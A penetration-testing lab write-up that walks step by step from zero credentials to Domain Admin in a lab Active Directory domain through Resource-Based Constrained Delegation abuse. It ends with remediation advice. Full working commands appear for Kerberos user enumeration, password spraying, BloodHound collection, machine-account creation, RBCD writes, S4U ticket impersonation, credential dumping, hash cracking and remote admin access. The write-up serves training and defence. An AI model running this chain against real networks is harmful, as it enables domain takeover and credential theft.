---
title: "AD Pentest — RBCD to Domain Admin"
published: 2026-04-27
description: "Full Active Directory attack chain from zero credentials to Domain Admin via Resource-Based Constrained Delegation abuse. No CVE, no software exploit — just misconfigured permissions."
image: /writeups/rbcd/ad.png
tags: [Active Directory, RBCD, BloodHound, Kerberos, Pentest Lab]
category: Writeups
---

# From Zero Creds to Domain Admin via RBCD

## Lab Environment

| Component | Value |
|-----------|-------|
| Domain | corp.local |
| Domain Controller | 192.168.1.10 (DC) |
| Target Workstation | 192.168.1.20 (WS01) |
| Target User | zouhair |
| OS | Windows Server 2022 Build 20348 x64 |
| Attacker | Kali Linux |

> [!NOTE]
> **LAB SETUP** — Two intentional misconfigurations were applied: (1) `zouhair` was granted `GenericWrite` over the WS01 computer object, and (2) the AD structure includes an IT group with delegated rights over workstations — a realistic shortcut common in real environments.

![AD Users — zouhair account in the domain](/writeups/rbcd/ad-users.png)

This picture demonstrate the target user and other domain users.

![AD Computers — WS01 visible in domain](/writeups/rbcd/ad-computers.png)
Here is the computer identity for the Workstation that will be our road to the Domain Controller

![AD Employees OU structure](/writeups/rbcd/ad-employees.png)

This picture demonstrate the Organizational Unit (Employees) and the security group (IT) that the user is also a member of.

---

## Phase 1 — Reconnaissance

Starting with a blank slate, no credentials, no knowledge of the environment. The first step is discovering what's on the network and identifying the Domain Controller.

### Network Discovery

```bash
# SYN scan to identify live hosts and open ports
nmap -sS 192.168.1.0/24
```

![nmap SYN scan — DC and WS01 identified on the network](/writeups/rbcd/ad-recon-identify-hosts.png)

The scan reveals two live hosts. **192.168.1.10** exposes ports 88, 389, 445, 3268 a classic AD Domain Controller fingerprint. **192.168.1.20** is WS01.

### User Enumeration via Kerberos

Using the nmap `krb5-enum-users` script, we probe the DC's Kerberos port to enumerate valid domain accounts without any credentials.

```bash
# Probe Kerberos for valid usernames
nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=corp.local,userdb=/usr/share/seclists/Username/Names/names.txt 192.168.1.10
```

![krb5-enum-users — valid Kerberos principals discovered](/writeups/rbcd/ad-recon-users.png)

> [!NOTE]
> Kerbrute sends AS-REQ packets to the DC. A valid user triggers `KDC_ERR_PREAUTH_REQUIRED`, while an invalid one returns `KDC_ERR_C_PRINCIPAL_UNKNOWN`. No lockout risk, no credentials needed.

---

## Phase 2 — Password Spraying

With a valid username list, we spray common passwords against SMB. Spraying one password at a time to avoid lockout.

```bash
netexec smb 192.168.1.10 -u users.txt -p /usr/share/seclists/Passwords/Common-Credentials/darkweb2017_top-10000.txt --continue-on-success
```

![Password spraying in progress](/writeups/rbcd/ad-password-spraying-1.png)

![Hit — corp.local\zouhair:Password123](/writeups/rbcd/ad-password-spraying-2.png)

> [!TIP]
> **CREDENTIALS OBTAINED** — `corp.local\zouhair : Password123`

### Validate on WS01

```bash
netexec smb 192.168.1.20 -u zouhair -p 'Password123'
```

![zouhair authenticates — but no Pwn3d!](/writeups/rbcd/ad-test-password.png)

The account authenticates but has no administrative access to WS01. This is where privilege escalation begins.

---

## Phase 3 — BloodHound Enumeration

With valid credentials, we collect the entire AD graph using BloodHound. This reveals relationships, permissions, and attack paths invisible to normal enumeration.

```bash
bloodhound-python -u zouhair -p 'Password123' -d corp.local -ns 192.168.1.10 -c All --zip
```

![BloodHound — full AD enumeration graph](/writeups/rbcd/ad-enumeration-bloodhound.png)
After lunching Bloodhound we upload the ZIP file we obtained earlier as shown below.
![BloodHound GUI — Uploading the ZIP file](/writeups/rbcd/ad-bloodhound-gui.png)

### Critical Finding — GenericWrite on WS01


We can search for any object to get information. Here is information about the domain user ZOUHAIR@CORP.LOCAL
![WS01 object information](/writeups/rbcd/ad-bloodhound-object-info.png)

![zouhair's group membership — member of IT group](/writeups/rbcd/ad-bloodhound-user-membership.png)
we notice that the user ZOUHAIR@CORP.LOCAL is a member of the Domain Users group and the IT group.

![Outbound control — zouhair has GenericWrite over WS01](/writeups/rbcd/ad-bloodhound-outbound-control-genericwrite.png)
After analyzing the Outbound Control, We can see that the user has `GenericWrite` over `WS01WS01.CORP.LOCAL`, inherited through IT group membership. This allows writing to the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute, which leads to an RBCD attack.


We can see also the Inbound control over the user.
![Inbound control rights on WS01](/writeups/rbcd/ad-bloodhound-inbound.png)



---

## Phase 4 — RBCD Attack Setup

Resource-Based Constrained Delegation (RBCD) allows a computer object to specify which accounts can impersonate users to it. Since `zouhair` has `GenericWrite` over WS01, we can write this attribute ourselves.

### Create a Controlled Machine Account

We start by creating a machine account `ZXGR$` in the domain. It will act as a controlled entity that we use to perform the RBCD attack.

```bash
impacket-addcomputer corp.local/zouhair:'Password123' -dc-ip 192.168.1.10 -computer-name 'ZXGR$' -computer-pass 'Active@123!'
```

![ZXGR$ machine account created successfully](/writeups/rbcd/ad-addingcomputer-impacket.png)

### Write RBCD Delegation Attribute

After creating the machine account, we now configure the delegation by writing to the target object:

```bash
impacket-rbcd corp.local/zouhair:'Password123' -dc-ip 192.168.1.10 -action write -delegate-to 'WS01$' -delegate-from 'ZXGR$'
```

![RBCD write — delegation rights modified on WS01](/writeups/rbcd/ad-delegate-write.png)

![RBCD read — ZXGR$ confirmed in delegation list](/writeups/rbcd/ad-delegate-verification.png)

> [!NOTE]
> WS01's `msDS-AllowedToActOnBehalfOfOtherIdentity` now includes `ZXGR$`. This instructs the KDC: *"trust ZXGR$ to impersonate any user to this machine"*.

---

## Phase 5 — Kerberos Impersonation (S4U)

This phase involves using S4U2Self and S4U2Proxy. We request a service ticket for `cifs/WS01` while impersonating `Administrator`, without ever knowing the Administrator's password.

Then we use the cached ticket to authenticate to the machine as Administrator.

```bash
impacket-getST corp.local/'ZXGR$':'Active@123!' -dc-ip 192.168.1.10 -spn cifs/WS01.corp.local -impersonate Administrator

export KRB5CCNAME=Administrator@cifs_WS01.corp.local@CORP.LOCAL.ccache
impacket-wmiexec -k -no-pass Administrator@WS01.corp.local
```

![S4U impersonation — forged service ticket for Administrator](/writeups/rbcd/ad-impersonate-admin-s4u.png)

![Exporting Kerberos ccache file](/writeups/rbcd/ad-export-ccache-file.png)

![Administrator shell obtained on WS01](/writeups/rbcd/ad-ws01-compromised.png)

---

## Phase 6 — Credential Dumping

After obtaining a valid ticket, we leverage it to access the workstation and dump cached credentials using `impacket`. The goal is to extract NTLM/DCC2 hashes without requiring plaintext passwords. Once the hashes are collected, we perform offline cracking using `hashcat` with a wordlist. This step allows us to recover weak credentials — in this case leading to the Administrator password, which gives us full control over the machine and moves us closer to compromising the domain.

```bash
impacket-secretsdump -k -no-pass WS01.corp.local

# Crack DCC2 hash
hashcat -m 2100 -a 0 admin_hash /usr/share/seclists/Passwords/corporate_passwords.txt --force
```

![Dumping cached credentials from WS01](/writeups/rbcd/ad-dumping-hashes.png)

![Hashcat cracking DCC2 hash offline](/writeups/rbcd/ad-cracking-hash.png)

![Hash cracked — Administrator password recovered](/writeups/rbcd/ad-cracked-hash.png)

> [!TIP]
> **ADMINISTRATOR PASSWORD**  `P@ssw0rd123!` 

---

## Phase 7 — Domain Controller Compromise

Using the recovered Administrator credentials, we directly authenticate to the Domain Controller via `evil-winrm`. At this point, we have full administrative access over the domain. From there, we perform a DCSync attack to dump all domain hashes, including the `krbtgt` account. This effectively means the domain is fully compromised, and we can forge Golden Tickets for persistent and unrestricted access.

```bash
evil-winrm -i 192.168.1.10 -u Administrator -p 'P@ssw0rd123!'
```

![Proof of Domain Controller compromise](/writeups/rbcd/ad-proof-dc.png)

![Domain fully compromised — all hashes obtained](/writeups/rbcd/ad-pwnd.png)

---

## Recommendations & Takeaways

This lab demonstrates that **a single misconfiguration** can cascade into a **full domain compromise**.

| Vulnerability | Remediation |
|--------------|-------------|
| GenericWrite on computer objects | Audit and remove excessive ACLs. Apply least privilege. |
| Weak password (Password123) | Enforce password complexity. Minimum 12 chars, lockout after 5 attempts. |
| Machine Account Quota = 10 | Set ms-DS-MachineAccountQuota to 0 for standard users. |
| RBCD abuse | Monitor changes to msDS-AllowedToActOnBehalfOfOtherIdentity in SIEM. |
| DCC2 crackable offline | Limit cached logons. Use Protected Users group for admin accounts. |
| No detection | Deploy Microsoft Defender for Identity (MDI). |

> [!IMPORTANT]
> **KEY INSIGHT** — This entire chain exploits *no software vulnerability*. Every step abused a misconfigured permission or a weak password. **Active Directory security is configuration security.**
